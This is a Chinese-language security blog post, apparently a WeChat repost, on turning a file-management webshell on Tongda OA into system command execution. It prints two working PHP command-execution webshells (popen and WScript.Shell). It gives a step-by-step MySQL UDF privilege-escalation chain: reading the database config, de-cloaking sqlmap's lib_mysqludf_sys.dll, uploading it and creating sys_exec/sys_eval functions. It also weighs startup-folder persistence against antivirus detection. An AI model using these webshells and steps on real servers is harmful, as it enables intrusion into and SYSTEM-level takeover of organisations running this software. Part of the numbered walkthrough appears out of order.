在上一篇文章之后，有小伙伴留言问通达OA获取权限后如何才能执行命令。本来是想留下一个小的悬念给大家，既然有人问起，咱们就把这个问题继续探讨一下。

传送门：

[某知名OA高版本getshell思路（附部分脚本）](https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==&mid=2247485294&idx=1&sn=5d72d1d14a8881a4cbdbe9d8d8b2aebf&chksm=c2a1d3e7f5d65af12df8c5aa30e9660bfda2599fcfc9bbf021fd270a7d57cac16ca6d0af276a&token=903180913&lang=zh_CN&scene=21#wechat_redirect)

##  **0x01 回顾过去**

熟悉通达的小伙伴都知道通达是属于集成安装环境，和一般的CMS不同，通达安装好之后是自带配置好的WEB服务器nginx，一般来说不存在环境问题导致的差异。通达在配置中默认配置了disable_functions选项，禁止了常见的命令执行函数，甚至就连phpinfo也是禁用的。为了测试方便，在后续的分析中都手动去除了phpinfo不能执行的限制。

在老版本的通达（大约11.4）中，对disable_functions配置的有明显的缺陷，早期版本的通达配置如图1.1所示。

![](https://image.3001.net/images/20220822/1661160720_63034d10a3f2fa86b9a1c.png!small)

图1.1 早期通达OA的disable_functions配置

从图1.1中可以看出在禁用的函数中缺陷了popen函数，所以可以通过popen函数来执行系统命令，相关代码如下所示。

基于popen的命令执行

    
    
    <?php
    @putenv("PATH=".getenv("PATH").";C:/Windows/system32;");
    $fp=@popen($_REQUEST['cmd'],'r');
    while(!@feof($fp)) {
      print(@fgets($fp,2048));
    }
    @pclose($fp);

另外网上也早有文章提到可以通过Windows的Com组件来执行命令，相关代码如下所示。

基于WScript的命令执行

    
    
    <?php
    $phpwsh=new COM("Wscript.Shell") or die("Create Wscript.Shell Failed!");  
    $exec=$phpwsh->exec("cmd.exe /c ".$_REQUEST['cmd']."");  
    $stdout = $exec->StdOut();  
    $stroutput = $stdout->ReadAll();  
    echo $stroutput;exit();
    ?>

通过这两种方式都可以达到命令执行的效果，如图1.2所示。

![](https://image.3001.net/images/20220822/1661160824_63034d78bd5bea4445e86.png!small)

图1.2 早期版本通达命令执行的方式

但是这两种方式在新版本的通达中均无法使用，首先来看新版本通达的disable_functions配置，如图1.3所示。

![](https://image.3001.net/images/20220822/1661160851_63034d9378f709257d4c6.png!small)

图1.3 新版本通达OA的disable_functions配置

可以看出在新版本中明显修复了早期版本中漏掉的popen函数，虽然并没有在disableClassed中禁用Com组件相关的类，但是实际上通达OA已经默默关闭了Com组件，如图1.4所示。

![](https://image.3001.net/images/20220822/1661160875_63034daba4772643372f4.png!small)

图1.4 对比新旧版版通达OA对Com组件支持的差异

所以上面的两种命令执行的方式对于新通达来说都已经不适用了，如果我们在哥斯拉中连接通达OA的webshell，在执行命令中会看到如图1.5所示的报错。![](https://image.3001.net/images/20220822/1661160904_63034dc81d5aba9c0e582.png!small)

图1.5 通达OA命令执行报错

##  **0x02 面对现实**

仔细查看图1.3的disable_functions中，我们可以想到下面的绕过方式。

1） 利用LD_PRELOAD记载恶意so文件达到执行命令的效果行不行？答案是不行，一般来说通达OA都是windows的环境，不适用这种方式。

2）
pcntl_exec函数没有在disable_functions的列表中，能不能利用这个函数来执行命令？答案也是不行，通达默认安装的环境没有pcntl扩展。

3） 利用ImageMagick来执行命令行不行？答案还是不行，默认安装的环境没有ImageMagick扩展。

目前想直接绕过disable_functions来执行命令已经是一件很难的事情了，换一种思路，我们目前有一个文件管理的webshell，并且通达OA默认安装都是system权限。怎么通过文件操作来执行命令呢？一种最简单的方式是直接把马上传到自启动目录，等待服务器重启，然后执行命令，这种是不是可行呢？可行，但是效果不好，一般不会这么用。因为一方面要等待服务器重启，这个条件不满足实际攻击场景，另一方面修改自启动目录容易被杀软拦截。

一种更好的办法是通过mysql udf来执行命令，整个利用过程如下所示。

![](https://image.3001.net/images/20220822/1661160943_63034def5d108bcf71c9e.png!small)

图2.1 数据库配置文件

2）
生成udf.dll文件，网上虽然可以直接下载到很多udf.dll，但是不确定是不是有后门。而且其他随意下载的udf.dll文件经常导致数据库崩溃（多次血与泪的教训，dll不对会导致网站崩溃）。我强烈建议大家使用sqlmap自带的udf.dll文件，但是默认情况下sqlmap的udf是混淆过的，需要使用其自带的cloak工具转换回来才能使用。

1）
找到通达OA的数据库配置文件webroot/inc/oa_config.php。通达OA的源码文件默认是加密的，但是配置文件是不加密的，所以可以直接打开查看，如图2.1所示。

    
    
    python extra/cloak/cloak.py -d -i data/udf/mysql/windows/64/lib_mysqludf_sys.dll_

使用上面的命令，会在lib_mysqludf_sys.dll_文件所在目录生成一个lib_mysqludf_sys.dll的文件，这个才是能被直接使用的udf提权dll文件。

3） 把刚才生成的文件lib_mysqludf_sys.dll上传到目标的mysql5/lib/plugin目录，默认情况下不存在这个目录，需要创建目录。

4） 连接数据库，执行下面的语句

    
    
    create function sys_exec RETURNS int soname 'lib_mysqludf_sys.dll'；//执行命令返回状态码
    create function sys_eval returns string soname 'lib_mysqludf_sys.dll '; //执行命令返回命令执行结果
    
    select sys_eval("whoami");

![](https://image.3001.net/images/20220822/1661161002_63034e2a4e5eed000af77.png!small)

如此方能在新版本中成功执行命令。

[原文链接﻿](https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==&mid=2247485312&idx=1&sn=0b8b0bd8d2c7cdd6eb80e6d7e52e2c74&chksm=c2a1d309f5d65a1f9d4e276ed4105458116f1110d9da3821dcba78a9ca58effdcebbfd25e99e&mpshare=1&scene=1&srcid=0822yc0OwnGJ9DidC9XclwTI&sharer_sharetime=1661160616159&sharer_shareid=108805e77d51d992a6171b59e539433d&version=4.0.12.6015&platform=win#rd)

